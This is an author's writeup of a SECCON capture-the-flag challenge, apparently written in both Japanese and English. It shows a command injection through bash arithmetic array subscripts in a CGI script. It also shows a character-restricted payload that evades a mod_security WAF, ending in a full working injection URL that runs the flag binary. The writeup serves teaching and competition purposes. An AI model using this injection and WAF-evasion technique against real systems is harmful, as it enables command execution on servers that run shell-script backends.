# Author’s Writeup

 **日本語・英語併記**で想定解を記載します。
翻訳は主に[DeepL](https://www.deepl.com/ja/translator)を使用しています。

Japanese and English are written together.

## Question 問題

cgiのソースコードとWAFの定義ファイルを提供していました。
This challenge provided the cgi source code and the WAF definition file.

```
Excute the /usr/bin/flag

http://xxx.xxx.xxx.xx/cgi-bin

WAFthrough.ta.gz
```

サーバにアクセスすると以下のように歴代の好成績チームが表示されます。
When you access the server, you will see the best performing teams.

URLは年毎に以下のように変化します。ソース見てもわかるんですが、GETで動いてますね。
The URLs change from year to year by GET.

```
http://xxx.xxx.xxx.xx/cgi-bin/index.cgi?q=v   # 2015
http://xxx.xxx.xxx.xx/cgi-bin/index.cgi?q=w   # 2016
http://xxx.xxx.xxx.xx/cgi-bin/index.cgi?q=x   # 2017
http://xxx.xxx.xxx.xx/cgi-bin/index.cgi?q=y   # 2018
http://xxx.xxx.xxx.xx/cgi-bin/index.cgi?q=z   # 2019
```

## Strategy 解き方

大きく2つのハードルをクリアすれば解けます。
You need to clear two hurdles.

1. Finding Vulnerable Locations for Command Injection. コマンドインジェクションの脆弱位を見つける
2. Bypassing the WAF and executing commands. WAFを回避してコマンドを実行する

>あと、解く時のコツなんですが、index.cgi はいわゆるシェルスクリプトなので自分のローカル環境で簡単に実行できます。
>コマンドインジェクションの脆弱性を見つけるために、サーバに対して無限に打ち込むよりも効率的に試せるはずです。

## Command injection vulnerability コマンドインジェクションの脆弱性

index.cgi の重要な箇所だけ抜き出してみます。
Let's extract the important part of index.cgi

```bash

#!/bin/bash
 
exec 2>&1 # for debug

if [ "$REQUEST_METHOD" = "GET" ]
then
  VAR="$(echo $QUERY_STRING|cut -c3-|nkf -w --url-input)"
  TARGET_FILE=$(sed -e 's/z/2019/g' -e 's/y/2018/g' -e 's/x/2017/g' -e 's/w/2016/g' -e 's/v/2015/g' <(echo $VAR))
  if [[ "$TARGET_FILE" -gt 2014 ]]
  then
    echo '<HR>'
    cat $TARGET_FILE
  fi
fi
```

やや不自然なコーディングに見えますが、一見してコマンドインジェクションの脆弱性があるようには見えません。
It does not appear to be vulnerable to command injection.

あと exec 2>&1 がありますね。標準出力でも標準エラー出力でもコマンド実行結果がブラウザに表示される作りになっていることがわかります。

>このテクニックはpwn問として出題された **pwarmup**でも解くために利用されましたね\^\^

### Bash's arithmetic formulas. bashの算術式

かなり端的にいうとbashの算術式の中では **配列の添字の中で任意のコマンド実行ができる**という仕様があります。
In fact, there is a specification in bash's arithmetic formula that allows for arbitrary command execution within the index of an array.

では、どういう場合に算術式の評価が行われるでしょうか。次の3つがあります（もっとあるかも）。

1. 算術式展開を使用した時 $(( x[$(date)] ))
2. if文のダブルブラケット &#91;&#91; &#93;&#93; で数値の比較をした時
3. typeset -i または declare -i で変数を定義し、値が代入された時

There are three patterns in which arithmetic formulas are evaluated.

1. This happens when you use arithmetic expression. $(( x[$(date)] ))
2. This happens when you use a new style of if statement.  if &#91;&#91; &#93;&#93;
3. This happens when a variable is defined with typeset -i or declare -i and a value is set to it.


実際に試してみましょう。
Let's give it a try.

```bash
$ cat vulnerability.sh

#!/bin/bash

VAL1='x[$(whoami>&2)]'

echo "Command injection part1" $(( VAL1 ))

echo "Command injection part2"
if [[ $VAL1 -gt 1 ]]
then
 :
fi

echo "Command injection part3"
typeset -i VAL2
VAL2='x[$(whoami>&2)]'
```

実行してみます。いずれもwhoamiが実行されてしまっています。
The command has been executed.

```
$ ./vulnerability.sh
kanata
Command injection part1 0
Command injection part2
kanata
Command injection part3
kanata
```

という訳で、index.cgiは **if文のダブルブラケットにコマンドインジェクションの脆弱性がある**ことがわかります
You were able to find a command injection vulnerability in index.cgi.

>この問題(WAFthrough)はシェルスクリプトが動くWebサーバというあまり見かけない構成にしています。これは問題をシンプルに作りたかったためです。
>現実では、一般的な業務システムのバックエンドにおいて、バッチ処理としてシェルスクリプトが動くケースが多いかと思います。
>ユーザからの細工された入力をバッチ処理が受け取った時、上記の脆弱性からコマンドインジェクションに繋がるリスクがあります。
>しんどいのは、この問題を解いたのが8チームのみという、ほとんど誰もこの仕様を知らないため、潜在的に沢山のシステムがこの脆弱性を抱えている可能性があるという点です。
>加えてif文のダブルブラケットにおいては、ユーザの入力をチェックする処理がそのまま脆弱になるパターンも考えられ、なかなかスリリングです。（私は基本的にif文のダブルブラケットでの判定を使わないことにしています）


## WAF definition WAFの定義

WAFはApacheのmod_securityを利用しています。定義内容から簡単に調べがつくと思います。
rules.confの大事な部分は以下です。
Let's try to extract the important parts of rules.conf

```
SecDefaultAction "phase:1,log,deny,status:403"
SecRule QUERY_STRING  "[Uu]"   "id:'9000001'"
SecRule QUERY_STRING  "[Ss]"   "id:'9000002'"
SecRule QUERY_STRING  "[Rr]"   "id:'9000003'"
SecRule QUERY_STRING  "[Bb]"   "id:'9000004'"
SecRule QUERY_STRING  "[Ii]"   "id:'9000005'"
SecRule QUERY_STRING  "[Nn]"   "id:'9000006'"
SecRule QUERY_STRING  "[Ff]"   "id:'9000007'"
SecRule QUERY_STRING  "[Ll]"   "id:'9000008'"
SecRule QUERY_STRING  "[Aa]"   "id:'9000009'"
SecRule QUERY_STRING  "[Gg]"   "id:'9000010'"
SecRule QUERY_STRING  "[0-9]"  "id:'9000011'"
SecRule QUERY_STRING  "([a-zA-Z]).*\1"  "id:'9000012'"
SecRule ARGS_COMBINED_SIZE "@gt 320" "id:'9000013'"

SecDefaultAction "phase:4,log,deny,status:403"
SecRule RESPONSE_BODY "SECCON" "id:'9000091'"
```

要約すると以下のようになります。

* UuSsRrBbIiNnFfLlAaGgの文字がリクエストパラメタにあるとダメ
* 数字がリクエストパラメタにあるとダメ
* 同じ英字が2回以上あるとダメ
* リクエストパラメタのサイズは320Byteまで
* レスポンスの中にSECCONという文字があるとダメ

Summary

* The letter "UuSsRrBbIiNnFfLlAaGg" must not be in the request parameter.
* The letter "0123456789" must not be in the request parameter.
* The same letter must not appear more than once in the request parameter.
* The size of the request parameter is up to 320 bytes.
* Don't have the word "SECCON" in response.


### Available characters 使用できる文字

という訳で以下の文字と記号だけでリクエストパラメタを作らなければなりません。
You have to create a request parameter with only the following characters and symbols.

* c,d,e,h,j,k,o,p,q,t
* C,D,D,H,J,K,O,P,Q,T,V,W,X,Y,Z

>v,w,x,y,zはWAFを通過しますが、index.cgiの中で西暦に変換されるため実質使えません。

## How to get through the WAF 原理

使える文字をよく見ると、WAFはe,c,h,oを制限していないことがわかります。
echoとbashの機能を使ってうまくflagを実行することができます!
You can run flag using the echo and bash features.

1. Setting the Array. 配列に入れる

```
X=($(echo /usr/bin/*))
```

2. Execute an array with a subscript. 配列に添え字を指定して実行

```
${X[183]} # flagの実行
```

## Numeric Generation 数値の生成

数字を使わないで数字を表現する必要があります。
以下のテクニックで数字を使わずに数字を表現できます。
This technique allows you to express numbers without using the letters 0123456789.

```
$? # :コマンドの終了ステータス->0
$(($$/$$+$$/$$+$$/$$)) #プロセスIDをプロセスIDで割る->3, 1+1+1
```

## Space Generation 空白の生成

意外に引っかかりがちなのが、URLの中でスペースが使えないというところです。スペースは%20に変換されますが、数字を含んでいるので今回のWAFに引っかかってしまいます。
Spaces are converted to %20 and cannot be used.

さまざまな方法がありますが、ここではdateの実行結果からスペースを抜き出す方法を使っています。
You can extract spaces from the results of the date command.

```
____=$(../../???/d?t?)　# dateの実行
echo ${____:3:1}       # スペースの取得（4文字目はスペース）
${____:$(($$/$$+$$/$$+$$/$$)):$(($$/$$))}
```

## Use echo twice

同じ英字は2回使うとWAFに検出されてしまいます。echoを2回使いたいため記号の変数に設定します。
You want to use echo twice, so you'll set the variable to be made up of symbols.

```
______=echo # echo
```

## flag execution

flagコマンドは以下で実行できます。
The flag command can be executed as follows.

```
__=($(echo ../../???/????));${__[20]} # flag
```

## base64 execution

flagコマンドを実行すると出力内容にフラグ形式である"SECCON"が含まれることが想定されます。（もしくは、実行するとWAFに引っかかるため、それで判断できます）
SECCONを編集する方法はいくつか思い浮かびますが、ここではbase64エンコードしてWAFを回避してみます。
To avoid WAF, you need to convert the SECCON characters in the response.

```
___=($(echo ../../???/??????));${___[1]} # base64
```

## Got it! Combined

という訳で、全部合体させるとこうなります!
You're going to combine them all.

```
X[$(____=$(../../???/d?t?);______=echo;__=($($______${____:$(($$/$$+$$/$$+$$/$$)):$(($$/$$))}../../???/????));___=($($______${____:$(($$/$$+$$/$$+$$/$$)):$(($$/$$))}../../???/??????));${__[$(($$/$$+$$/$$))$?]}|${___[$(($$/$$))]})]
```

最終的にやってることは以下です。
Here's what you're ultimately doing.

```
../../bin/flag|../../bin/base64
```

## Answer

以下でアクセスすると、base64エンコードされたflagを得ることができます。これが想定解でした。
You can get the base64 encoded flag if you access it at the following URL.This was the expected solution.

```
http://xxx.xxx.xxx.xx/cgi-bin/index.cgi?q=X[$(____=$(../../???/d?t?);______=echo;__=($($______${____:$(($$/$$+$$/$$+$$/$$)):$(($$/$$))}../../???/????));___=($($______${____:$(($$/$$+$$/$$+$$/$$)):$(($$/$$))}../../???/??????));${__[$(($$/$$+$$/$$))$?]}|${___[$(($$/$$))]})]
```

```
$ echo U0VDQ09Oe1dBRjAwMDAwMDAwMDAhfQo=|base64 -d
SECCON{WAF0000000000!}
```

